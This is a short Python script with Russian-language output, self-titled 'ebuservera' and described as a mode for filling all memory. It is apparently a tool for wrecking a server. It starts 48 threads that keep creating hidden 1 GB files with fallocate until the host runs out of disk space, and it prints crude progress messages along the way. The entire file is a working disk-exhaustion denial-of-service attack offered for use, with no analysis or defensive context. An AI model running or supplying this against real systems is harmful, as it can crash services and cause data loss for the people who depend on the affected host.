import threading
import subprocess
import uuid
from time import sleep

megabytes = 0
curr = 0


def allocate_space():
    global megabytes, curr
    while True:
        try:
            target = f".___tmp_{uuid.uuid4()}"
            subprocess.run(["fallocate", "-l", "1G", target], check=True)
            curr += 1
            megabytes += 1
        except subprocess.CalledProcessError as e:
            print("Нету места на хосте, ")
            break
        except Exception as e:
            pass


def display_status():
    global megabytes, curr
    displays = 0
    try:
        while True:
            sleep(0.1)
            displays += 1
            print(f"Закачал всего [ {megabytes} ГБ ] со скоростью [ {curr} Гб/с ]")
            if displays % 10 == 0:
                curr = 0
    except Exception as e:
        print(e)


def main():
    print("ebuservera by fiuimwix")
    print("Режим: забивка всей памяти")
    print("Подготовка..")

    threads = []
    for _ in range(48):
        thread = threading.Thread(target=allocate_space)
        thread.start()
        threads.append(thread)

    print("Начали нахуй!")
    status_thread = threading.Thread(target=display_status)
    status_thread.start()


if __name__ == "__main__":
    main()
